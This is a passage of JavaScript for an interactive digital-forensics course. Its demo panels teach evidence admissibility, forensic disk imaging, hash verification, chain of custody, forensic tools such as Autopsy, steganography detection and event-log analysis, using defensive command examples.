            admiss: 'EVIDENCE ADMISSIBILITY:\n\nFor digital evidence to be admissible:\n\n✅ AUTHENTICITY:\n   Prove evidence is what it claims to be\n   Hash values, timestamps, metadata\n\n✅ INTEGRITY:\n   Evidence not altered since collection\n   Forensic images, write blockers\n\n✅ RELIABILITY:\n   Collected using accepted methods\n   Documented procedures followed\n\n✅ CHAIN OF CUSTODY:\n   Complete documentation of handling\n   No unexplained gaps\n\n❌ EVIDENCE CAN BE THROWN OUT IF:\n   • Illegally obtained\n   • Chain of custody broken\n   • Improper handling (modified)\n   • Expert not qualified\n   • Methods not scientifically accepted',
            warrant: 'SEARCH WARRANTS & CONSENT:\n\n┌─────────────────────────────────────┐\n│ WHEN WARRANT REQUIRED?              │\n├─────────────────────────────────────┤\n│ • Law enforcement searching         │\n│   personal devices/property         │\n│ • Accessing private communications  │\n│ • Cloud storage (varies by provider)│\n└─────────────────────────────────────┘\n\n┌─────────────────────────────────────┐\n│ CONSENT ALTERNATIVES                │\n├─────────────────────────────────────┤\n│ • Owner consent (document it!)      │\n│ • Employment agreements (corporate) │\n│ • Terms of service acceptance       │\n│ • Exigent circumstances             │\n└─────────────────────────────────────┘\n\nCORPORATE INVESTIGATIONS:\n  • Employee handbook policies\n  • Login banners stating monitoring\n  • Written consent forms\n  • HR/Legal involvement recommended',
            testimony: 'EXPERT WITNESS TESTIMONY:\n\nFORENSIC EXPERTS MAY TESTIFY:\n\n📋 QUALIFYING AS EXPERT:\n   • Education and training\n   • Certifications held\n   • Years of experience\n   • Previous testimony\n   • Published works\n\n🗣️ TESTIMONY REQUIREMENTS:\n   • Explain technical concepts simply\n   • Describe methodology used\n   • Present findings objectively\n   • Answer cross-examination\n   • Stay within expertise boundaries\n\n⚠️ COMMON CHALLENGES:\n   • Defense questioning methods\n   • Tool validation attacks\n   • Alternative interpretations\n   • Timeline challenges\n\n📝 PREPARATION:\n   • Review all notes thoroughly\n   • Practice explaining findings\n   • Prepare visual aids\n   • Anticipate questions'
        };
        $('#legalOut').textContent = data.admiss;
        $$('#legalTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#legalTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#legalOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 34: evidence-acquisition - Evidence Acquisition
    function demoEvidenceAcquisition(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">ACQUISITION</span><span class="demo-title">Evidence Acquisition</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="acquireTabs">
                <button class="demo-btn demo-btn-sm active" data-t="imaging">Disk Imaging</button>
                <button class="demo-btn demo-btn-sm" data-t="formats">Image Formats</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tools</button>
            </div>
            <div id="acquireOut" style="background:#1a1a2e;color:#a5d6a7;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            imaging: 'FORENSIC DISK IMAGING:\n\nCreating bit-for-bit copy of storage media\n\n┌─────────────────────────────────────┐\n│ SOURCE DRIVE ──▶ FORENSIC IMAGE    │\n│ (Original)       (Exact copy)       │\n└─────────────────────────────────────┘\n\nKEY PRINCIPLES:\n  1. Use write blocker (hardware/software)\n  2. Never modify original evidence\n  3. Calculate hash before & after\n  4. Document everything\n\nWRITE BLOCKER:\n  Prevents ANY writes to source drive\n  Hardware: Tableau, Wiebetech\n  Software: dcfldd block device\n\n# Example with dc3dd\n$ dc3dd if=/dev/sdb of=evidence.dd \\\n        hash=md5 hash=sha256 log=imaging.log\n\n# Verify hash matches\n$ md5sum evidence.dd',
            formats: 'FORENSIC IMAGE FORMATS:\n\n┌─────────────────────────────────────┐\n│ RAW (DD)                            │\n│ • Bit-for-bit copy                  │\n│ • No compression                    │\n│ • Universal compatibility           │\n│ • Large file size                   │\n│ File extension: .dd, .raw, .img     │\n├─────────────────────────────────────┤\n│ E01 (EnCase)                        │\n│ • Compression supported             │\n│ • Built-in hash verification        │\n│ • Case metadata storage             │\n│ • Industry standard                 │\n│ File extension: .E01, .E02...       │\n├─────────────────────────────────────┤\n│ AFF (Advanced Forensic Format)      │\n│ • Open source format                │\n│ • Compression & encryption          │\n│ • Metadata support                  │\n│ File extension: .aff                │\n└─────────────────────────────────────┘\n\nRecommended: E01 for most investigations',
            tools: 'ACQUISITION TOOLS:\n\n🔧 COMMAND LINE:\n\n# dd (basic)\n$ dd if=/dev/sdb of=image.dd bs=4096\n\n# dc3dd (forensic dd)\n$ dc3dd if=/dev/sdb of=image.dd hash=sha256\n\n# dcfldd (enhanced dd)\n$ dcfldd if=/dev/sdb of=image.dd hash=md5\n        hashlog=hashes.txt\n\n🔧 GUI TOOLS:\n\n• FTK Imager (Free, Windows)\n  - E01, SMART, DD formats\n  - Memory capture\n  - File preview\n\n• Guymager (Free, Linux)\n  - Fast imaging\n  - Multiple formats\n  - Verification built-in\n\n• EnCase (Commercial)\n  - Full forensic suite\n  - E01 native support\n\n• Cellebrite (Mobile)\n  - Phone extraction\n  - Chip-off capability'
        };
        $('#acquireOut').textContent = data.imaging;
        $$('#acquireTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#acquireTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#acquireOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 35: hashing-verification - Hashing and Verification
    function demoHashingVerification(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">VERIFY</span><span class="demo-title">Hashing and Verification</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="hashVerTabs">
                <button class="demo-btn demo-btn-sm active" data-t="why">Why Hashing?</button>
                <button class="demo-btn demo-btn-sm" data-t="algos">Algorithms</button>
                <button class="demo-btn demo-btn-sm" data-t="practice">Practice</button>
            </div>
            <div id="hashVerOut" style="background:#1a1a2e;color:#90caf9;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            why: 'WHY HASHING IN FORENSICS?\n\nPROVE INTEGRITY:\n  Hash = Digital fingerprint\n  Any change = Different hash\n\n┌─────────────────────────────────────┐\n│ Original Evidence                   │\n│ SHA256: a7b2c3d4e5f6...            │\n│         ↓                           │\n│ Create forensic image               │\n│         ↓                           │\n│ Forensic Image                      │\n│ SHA256: a7b2c3d4e5f6...  ✓ MATCH   │\n└─────────────────────────────────────┘\n\nUSE CASES:\n  • Verify imaging was accurate\n  • Prove evidence not modified\n  • Match known malware (hash DB)\n  • Identify duplicate files\n  • Filter known good files (NSRL)\n\n⚠️ One bit difference = completely\n   different hash value!',
            algos: 'HASH ALGORITHMS IN FORENSICS:\n\n┌──────────┬────────┬───────────────┐\n│ Algorithm│ Length │ Use Case      │\n├──────────┼────────┼───────────────┤\n│ MD5      │ 128-bit│ Quick checks  │\n│          │ 32 hex │ (collisions!) │\n├──────────┼────────┼───────────────┤\n│ SHA-1    │ 160-bit│ Legacy        │\n│          │ 40 hex │ (deprecated)  │\n├──────────┼────────┼───────────────┤\n│ SHA-256  │ 256-bit│ Standard now  │\n│          │ 64 hex │ Recommended!  │\n├──────────┼────────┼───────────────┤\n│ SHA-512  │ 512-bit│ High security │\n│          │ 128 hex│ Slower        │\n└──────────┴────────┴───────────────┘\n\n⚠️ BEST PRACTICE:\n   Calculate BOTH MD5 and SHA-256\n   MD5 for quick filtering\n   SHA-256 for legal verification',
            practice: 'HASHING IN PRACTICE:\n\n# Calculate hash of a file\n$ md5sum evidence.dd\na7b2c3d4e5f6789012345678abcdef01  evidence.dd\n\n$ sha256sum evidence.dd\na7b2c3d4e5f6...64chars...  evidence.dd\n\n# Hash entire disk image\n$ dc3dd if=evidence.dd hash=md5 hash=sha256 \\\n        hlog=hashes.txt\n\n# Verify against known hash\n$ echo "a7b2c3..." | sha256sum -c\nevidence.dd: OK\n\n# Hash all files in directory\n$ find /evidence -type f -exec sha256sum {} \\; \\\n        > file_hashes.txt\n\n# Compare to known malware hashes\n$ grep -f malware_hashes.txt file_hashes.txt\n\n📂 HASH DATABASES:\n   • NSRL (Known software)\n   • VirusTotal\n   • HashSets (custom)'
        };
        $('#hashVerOut').textContent = data.why;
        $$('#hashVerTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#hashVerTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#hashVerOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 36: forensic-tools-overview - Forensic Tools Overview
    function demoForensicToolsOverview(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">TOOLS</span><span class="demo-title">Forensic Tools Overview</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="toolsOverTabs">
                <button class="demo-btn demo-btn-sm active" data-t="free">Free Tools</button>
                <button class="demo-btn demo-btn-sm" data-t="commercial">Commercial</button>
                <button class="demo-btn demo-btn-sm" data-t="choose">How to Choose</button>
            </div>
            <div id="toolsOverOut" style="background:#1a1a2e;color:#c5e1a5;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            free: 'FREE/OPEN SOURCE FORENSIC TOOLS:\n\n┌─────────────────────────────────────┐\n│ DISK FORENSICS                      │\n│ • Autopsy (GUI, Sleuth Kit based)   │\n│ • Sleuth Kit (CLI tools)            │\n│ • FTK Imager (imaging, preview)     │\n├─────────────────────────────────────┤\n│ MEMORY FORENSICS                    │\n│ • Volatility 2 & 3                  │\n│ • Rekall (Google)                   │\n│ • LiME (Linux Memory Extractor)     │\n├─────────────────────────────────────┤\n│ TIMELINE                            │\n│ • log2timeline/plaso                │\n│ • Timesketch (visualization)        │\n├─────────────────────────────────────┤\n│ NETWORK                             │\n│ • Wireshark                         │\n│ • NetworkMiner (free edition)       │\n│ • tcpdump                           │\n├─────────────────────────────────────┤\n│ FILE RECOVERY                       │\n│ • Photorec                          │\n│ • Scalpel                           │\n│ • foremost                          │\n└─────────────────────────────────────┘',
            commercial: 'COMMERCIAL FORENSIC TOOLS:\n\n┌─────────────────────────────────────┐\n│ ENCASE (OpenText)                   │\n│ • Industry standard                 │\n│ • Full forensic suite               │\n│ • Court-accepted                    │\n│ Price: ~$3,500/year                 │\n├─────────────────────────────────────┤\n│ FTK (Exterro)                       │\n│ • Fast processing                   │\n│ • Distributed processing            │\n│ • Email analysis                    │\n│ Price: ~$3,000-6,000                │\n├─────────────────────────────────────┤\n│ X-WAYS FORENSICS                    │\n│ • Lightweight, efficient            │\n│ • German engineering                │\n│ • Excellent value                   │\n│ Price: ~$1,000-2,000                │\n├─────────────────────────────────────┤\n│ CELLEBRITE (Mobile)                 │\n│ • Mobile device specialist          │\n│ • UFED series                       │\n│ Price: $5,000-15,000+               │\n├─────────────────────────────────────┤\n│ MAGNET AXIOM                        │\n│ • Cloud/mobile focus                │\n│ • Modern interface                  │\n│ Price: ~$3,500/year                 │\n└─────────────────────────────────────┘',
            choose: 'HOW TO CHOOSE FORENSIC TOOLS:\n\nCONSIDERATIONS:\n\n✅ CASE TYPE:\n   • Criminal → Court-accepted tools\n   • Corporate IR → Speed matters\n   • Research → Open source OK\n\n✅ BUDGET:\n   • Free: Autopsy, Volatility\n   • Mid: X-Ways (~$1K)\n   • Enterprise: EnCase, FTK (~$3K+)\n\n✅ EXPERTISE:\n   • Beginners: Autopsy (GUI)\n   • Advanced: Sleuth Kit (CLI)\n   • Expert: Mix of tools\n\n✅ DEVICE TYPE:\n   • Computers: EnCase, Autopsy\n   • Mobile: Cellebrite, MOBILedit\n   • Memory: Volatility\n\n🎯 RECOMMENDATION:\n   Start with Autopsy (free, GUI)\n   Learn CLI tools for automation\n   Use commercial when needed for:\n   • Speed on large cases\n   • Court testimony\n   • Specific device support'
        };
        $('#toolsOverOut').textContent = data.free;
        $$('#toolsOverTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#toolsOverTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#toolsOverOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 37: autopsy-intro - Introduction to Autopsy
    function demoAutopsyIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">AUTOPSY</span><span class="demo-title">Introduction to Autopsy</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="autopsyTabs">
                <button class="demo-btn demo-btn-sm active" data-t="overview">Overview</button>
                <button class="demo-btn demo-btn-sm" data-t="features">Features</button>
                <button class="demo-btn demo-btn-sm" data-t="workflow">Workflow</button>
            </div>
            <div id="autopsyOut" style="background:#263238;color:#4dd0e1;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            overview: 'AUTOPSY DIGITAL FORENSICS PLATFORM:\n\n🔧 Open source GUI forensic tool\n📦 Built on: The Sleuth Kit\n🏢 Maintainer: Basis Technology\n📅 Platform: Windows, Linux, macOS\n\n┌─────────────────────────────────────┐\n│ AUTOPSY = GUI for Sleuth Kit       │\n│                                     │\n│ User-friendly interface for:        │\n│ • Disk image analysis               │\n│ • File recovery                     │\n│ • Timeline analysis                 │\n│ • Keyword searching                 │\n│ • Hash filtering                    │\n│ • Report generation                 │\n└─────────────────────────────────────┘\n\nDOWNLOAD:\n  https://www.autopsy.com/download/\n\n⭐ Perfect for beginners!\n   Free, powerful, well-documented',
            features: 'AUTOPSY KEY FEATURES:\n\n📁 CASE MANAGEMENT:\n   • Multiple data sources per case\n   • Centralized reporting\n   • Team collaboration\n\n🔍 ANALYSIS MODULES:\n   • File Type Detection\n   • Hash Lookup (NSRL, custom)\n   • Keyword Search (indexed)\n   • Email Parser\n   • Web Artifacts\n   • Encryption Detection\n   • Interesting Files Finder\n   • PhotoRec Carving\n   • Timeline Generation\n\n🗂️ FILE SYSTEM SUPPORT:\n   • NTFS, FAT, ExFAT, HFS+, Ext2/3/4\n   • Raw images, E01, VHD/VMDK\n\n📊 VISUALIZATION:\n   • Timeline view\n   • Image gallery\n   • Geolocation mapping\n   • Communication analysis\n\n📋 REPORTING:\n   • HTML, Excel, custom reports\n   • Tagged item export\n   • Portable case creation',
            workflow: 'AUTOPSY BASIC WORKFLOW:\n\n1. CREATE NEW CASE:\n   ┌─────────────────────────────┐\n   │ Case Name: Investigation001│\n   │ Base Directory: /cases     │\n   │ Examiner: Your Name        │\n   └─────────────────────────────┘\n\n2. ADD DATA SOURCE:\n   ┌─────────────────────────────┐\n   │ • Disk Image (E01, DD)     │\n   │ • Local Disk               │\n   │ • Logical Files            │\n   │ • Unallocated Space        │\n   └─────────────────────────────┘\n\n3. SELECT INGEST MODULES:\n   ┌─────────────────────────────┐\n   │ ☑ Hash Lookup              │\n   │ ☑ File Type Identification │\n   │ ☑ Keyword Search           │\n   │ ☑ Recent Activity          │\n   │ ☑ Email Parser             │\n   └─────────────────────────────┘\n\n4. WAIT FOR PROCESSING\n\n5. ANALYZE RESULTS\n\n6. TAG & REPORT'
        };
        $('#autopsyOut').textContent = data.overview;
        $$('#autopsyTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#autopsyTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#autopsyOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 38: evidence-chain-custody - Evidence Chain of Custody
    function demoEvidenceChainCustody(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">LEGAL</span><span class="demo-title">Evidence Chain of Custody</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="chainTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Is It?</button>
                <button class="demo-btn demo-btn-sm" data-t="form">CoC Form</button>
                <button class="demo-btn demo-btn-sm" data-t="best">Best Practices</button>
            </div>
            <div id="chainOut" style="background:#2d2d30;color:#ffca28;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'CHAIN OF CUSTODY (CoC):\n\nDocumentation tracking evidence from\ncollection to court presentation.\n\n┌─────────────────────────────────────┐\n│ CRIME SCENE                         │\n│      ↓ (Collection - Who, When)     │\n│ TRANSPORT                           │\n│      ↓ (Transfer - Signed over)     │\n│ FORENSIC LAB                        │\n│      ↓ (Analysis - Documented)      │\n│ EVIDENCE STORAGE                    │\n│      ↓ (Secured - Logged access)    │\n│ COURTROOM                           │\n└─────────────────────────────────────┘\n\nWHY IT MATTERS:\n  • Proves evidence authenticity\n  • Shows no tampering occurred\n  • Required for court admissibility\n  • Breaks → Evidence excluded!',
            form: 'CHAIN OF CUSTODY FORM:\n\n┌─────────────────────────────────────┐\n│ EVIDENCE CUSTODY DOCUMENT           │\n├─────────────────────────────────────┤\n│ Case #: 2024-CYB-0042               │\n│ Evidence #: E-001                   │\n│ Description: Samsung SSD 500GB      │\n│ Serial #: S4CNNE0K123456            │\n│ Hash: SHA256: a7f8e3...             │\n├─────────────────────────────────────┤\n│ CUSTODY TRANSFERS:                  │\n│                                     │\n│ 1. Collected by: J. Smith           │\n│    Date/Time: 2024-01-15 14:30      │\n│    Location: 123 Main St, Room 205  │\n│    Signature: [J. Smith]            │\n│                                     │\n│ 2. Received by: Forensic Lab        │\n│    Date/Time: 2024-01-15 16:45      │\n│    Signature: [M. Johnson]          │\n│    Purpose: Forensic analysis       │\n└─────────────────────────────────────┘',
            best: 'CHAIN OF CUSTODY BEST PRACTICES:\n\n✅ COLLECTION:\n   • Document EVERYTHING\n   • Photograph before touching\n   • Use evidence bags/containers\n   • Label immediately (case #, date, name)\n   • Calculate hash on-site if possible\n\n✅ TRANSPORT:\n   • Minimize transfers\n   • Use tamper-evident packaging\n   • Document every handoff\n   • Keep evidence secure at all times\n\n✅ STORAGE:\n   • Locked evidence room\n   • Access log required\n   • Climate controlled\n   • Regular audits\n\n✅ DOCUMENTATION:\n   • Date and time (precise)\n   • Full names and signatures\n   • Purpose of each transfer\n   • Condition of evidence\n\n❌ COMMON MISTAKES:\n   • Gaps in timeline\n   • Missing signatures\n   • Vague descriptions\n   • Improper storage'
        };
        $('#chainOut').textContent = data.what;
        $$('#chainTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#chainTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#chainOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 39: steganography - Steganography
    function demoSteganography(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">HIDDEN</span><span class="demo-title">Steganography</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="stegoTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Is It?</button>
                <button class="demo-btn demo-btn-sm" data-t="types">Types</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
            </div>
            <div id="stegoOut" style="background:#1a1a2e;color:#7c4dff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'STEGANOGRAPHY:\n\nHiding data within other data\n(Greek: "covered writing")\n\n┌─────────────────────────────────────┐\n│ CRYPTOGRAPHY vs STEGANOGRAPHY       │\n├─────────────────────────────────────┤\n│ Crypto: Data is visible but         │\n│         unreadable (encrypted)      │\n│                                     │\n│ Stego:  Data is invisible           │\n│         (hidden in plain sight)     │\n└─────────────────────────────────────┘\n\nUSE CASES:\n  🔒 Covert communication\n  💾 Data exfiltration (attackers)\n  🏛️ Digital watermarking\n  🕵️ Espionage\n\nCARRIER TYPES:\n  • Images (JPEG, PNG, BMP)\n  • Audio (MP3, WAV)\n  • Video (MP4, AVI)\n  • Documents (PDF, DOCX)\n  • Network traffic',
            types: 'STEGANOGRAPHY TECHNIQUES:\n\n📷 IMAGE STEGANOGRAPHY:\n\nLSB (Least Significant Bit):\n  Original pixel: 10110110 (182)\n  Modified pixel: 10110111 (183)\n                       ↑ hidden bit\n  Imperceptible to human eye!\n\n🎵 AUDIO STEGANOGRAPHY:\n  • LSB in audio samples\n  • Echo hiding\n  • Phase coding\n  • Spread spectrum\n\n📄 TEXT STEGANOGRAPHY:\n  • Whitespace (tabs/spaces)\n  • Zero-width characters\n  • Word shifting\n  • Synonym substitution\n\n🌐 NETWORK STEGANOGRAPHY:\n  • TCP timestamps\n  • ICMP payload\n  • DNS queries\n  • HTTP headers\n\nTOOLS:\n  • Steghide (images/audio)\n  • OpenStego (images)\n  • snow (whitespace)\n  • Invisible Secrets',
            detect: 'STEGANALYSIS (Detection):\n\n🔍 VISUAL ANALYSIS:\n   • Unusual file sizes\n   • Metadata anomalies\n   • Color histogram analysis\n   • Noise patterns\n\n📊 STATISTICAL ANALYSIS:\n   • Chi-square attack\n   • RS analysis\n   • Sample pair analysis\n   • First-order statistics\n\n🛠️ DETECTION TOOLS:\n\n  # StegDetect (images)\n  $ stegdetect -t jopi image.jpg\n  image.jpg : jphide(**)\n\n  # StegExpose\n  $ java -jar StegExpose.jar image.jpg\n  \n  # Binwalk (embedded files)\n  $ binwalk -e suspicious.png\n  \n  # strings (hidden text)\n  $ strings suspicious.jpg | grep -i password\n\n⚠️ INDICATORS:\n   • File larger than expected\n   • Embedded file headers\n   • Abnormal LSB distribution'
        };
        $('#stegoOut').textContent = data.what;
        $$('#stegoTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#stegoTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#stegoOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 40: event-logs-forensics - Event Logs in Forensics
    function demoEventLogsForensics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">LOGS</span><span class="demo-title">Event Logs in Forensics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eventLogsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="windows">Windows</button>
                <button class="demo-btn demo-btn-sm" data-t="linux">Linux</button>
                <button class="demo-btn demo-btn-sm" data-t="key">Key Events</button>
            </div>
            <div id="eventLogsOut" style="background:#0d1117;color:#58a6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            windows: 'WINDOWS EVENT LOGS:\n\nLocation: C:\\Windows\\System32\\winevt\\Logs\\\n\nMAIN LOG FILES:\n  • Security.evtx    - Auth, access\n  • System.evtx      - System events\n  • Application.evtx - App events\n  • PowerShell/*.evtx - PS execution\n\nVIEW LOGS:\n  Event Viewer (eventvwr.msc)\n  PowerShell: Get-WinEvent\n  wevtutil.exe (CLI)\n\nEXPORT FOR ANALYSIS:\n  wevtutil epl Security C:\\export\\sec.evtx\n\nPARSE WITH TOOLS:\n  • EvtxECmd (Eric Zimmerman)\n  • python-evtx\n  • Log Parser\n\n# EvtxECmd example\nEvtxECmd.exe -f Security.evtx\n  --csv C:\\output --csvf security.csv',
            linux: 'LINUX LOG FILES:\n\nLocation: /var/log/\n\nKEY LOG FILES:\n  auth.log      - Authentication\n  syslog        - System messages\n  kern.log      - Kernel messages\n  apt/history   - Package installs\n  btmp          - Failed logins (binary)\n  wtmp          - Login history (binary)\n  lastlog       - Last login info\n  secure        - Auth (RHEL/CentOS)\n  messages      - General (RHEL)\n\nVIEW BINARY LOGS:\n  $ last          # wtmp\n  $ lastb         # btmp (failed)\n  $ lastlog       # lastlog\n\nSEARCH LOGS:\n  $ grep "Failed password" /var/log/auth.log\n  $ journalctl -u sshd --since "1 hour ago"\n\nROTATED LOGS:\n  auth.log.1, auth.log.2.gz\n  $ zgrep "pattern" auth.log.2.gz',
            key: 'KEY FORENSIC EVENTS:\n\nWINDOWS SECURITY EVENTS:\n  4624 - Successful login\n  4625 - Failed login\n  4634 - Logoff\n  4648 - Explicit credentials (runas)\n  4672 - Admin/special login\n  4688 - Process created\n  4697 - Service installed\n  4720 - User account created\n  4732 - Member added to group\n  7045 - Service installed (System)\n\nLINUX AUTH EVENTS:\n  "Accepted password" - Successful SSH\n  "Failed password"   - Failed attempt\n  "session opened"    - Login session\n  "session closed"    - Logout\n  "sudo:"             - Privilege escalation\n\n🎯 INVESTIGATION TIPS:\n  • Correlate timestamps\n  • Look for lateral movement (4648)\n  • Check for privilege escalation\n  • Service installations = persistence\n  • Failed → Success = brute force'
        };
        $('#eventLogsOut').textContent = data.windows;
        $$('#eventLogsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#eventLogsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eventLogsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 41: file-integrity-hashes - File Integrity & Hashes
    function demoFileIntegrityHashes(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">HASH</span><span class="demo-title">File Integrity & Hashes</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="integrityTabs">
                <button class="demo-btn demo-btn-sm active" data-t="why">Why Hash?</button>
                <button class="demo-btn demo-btn-sm" data-t="how">How To</button>
                <button class="demo-btn demo-btn-sm" data-t="verify">Verification</button>
            </div>
            <div id="integrityOut" style="background:#1e1e1e;color:#4ec9b0;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            why: 'WHY HASH FILES IN FORENSICS?\n\n┌─────────────────────────────────────┐\n│ HASH = Digital Fingerprint          │\n│ Same file → Same hash (always)      │\n│ 1 bit change → Different hash       │\n└─────────────────────────────────────┘\n\nFORENSIC PURPOSES:\n\n1. EVIDENCE INTEGRITY\n   Hash at collection = Hash at court\n   Proves no tampering occurred\n\n2. FILE IDENTIFICATION\n   Known malware → Hash database\n   NSRL (National Software Ref Library)\n\n3. DEDUPLICATION\n   Same hash = Same file\n   Skip analyzing duplicates\n\n4. KNOWN FILE FILTERING\n   Exclude OS files (known good)\n   Focus on unknown/unique files\n\nALGORITHMS:\n  MD5    - Fast, collision vulnerable\n  SHA1   - Deprecated (collisions found)\n  SHA256 - Current standard ✓',
            how: 'CALCULATING HASHES:\n\nLINUX/macOS:\n  # MD5\n  $ md5sum evidence.dd\n  $ md5 evidence.dd (macOS)\n\n  # SHA256\n  $ sha256sum evidence.dd\n  $ shasum -a 256 evidence.dd\n\nWINDOWS:\n  > certutil -hashfile evidence.dd MD5\n  > certutil -hashfile evidence.dd SHA256\n\n  # PowerShell\n  > Get-FileHash evidence.dd -Algorithm SHA256\n\nOUTPUT EXAMPLE:\n  $ sha256sum evidence.dd\n  a7f8e3c9b2d4f6a8e0c2d4f6a8b0c2d4\n  f6a8b0c2d4f6a8e0c2d4f6a8b0c2d4e6\n  evidence.dd\n\nFORENSIC TOOLS:\n  • FTK Imager (auto-hashes images)\n  • dc3dd (forensic dd with hashing)\n  • hashdeep (recursive hashing)',
            verify: 'HASH VERIFICATION:\n\n┌─────────────────────────────────────┐\n│ EVIDENCE COLLECTION                 │\n│ Original hash: a7f8e3c9...          │\n│ Documented in evidence form         │\n├─────────────────────────────────────┤\n│ COURT PRESENTATION                  │\n│ Current hash: a7f8e3c9...           │\n│ MATCH ✓ = Integrity preserved       │\n└─────────────────────────────────────┘\n\nAUTOMATED VERIFICATION:\n\n# Create hash file\n$ sha256sum *.dd > checksums.sha256\n\n# Verify later\n$ sha256sum -c checksums.sha256\nevidence.dd: OK\nmemory.dd: OK\n\n⚠️ HASH MISMATCH:\n   Evidence may be inadmissible\n   Investigate cause immediately:\n   • Corrupted storage?\n   • Accidental modification?\n   • Intentional tampering?\n\n🎯 BEST PRACTICE:\n   Hash IMMEDIATELY upon collection\n   Document hash, date, time, witness\n   Re-hash before every transfer'
        };
        $('#integrityOut').textContent = data.why;
        $$('#integrityTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#integrityTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#integrityOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 42: incident-response - Incident Response
    function demoIncidentResponse(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">IR</span><span class="demo-title">Incident Response</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="irTabs">
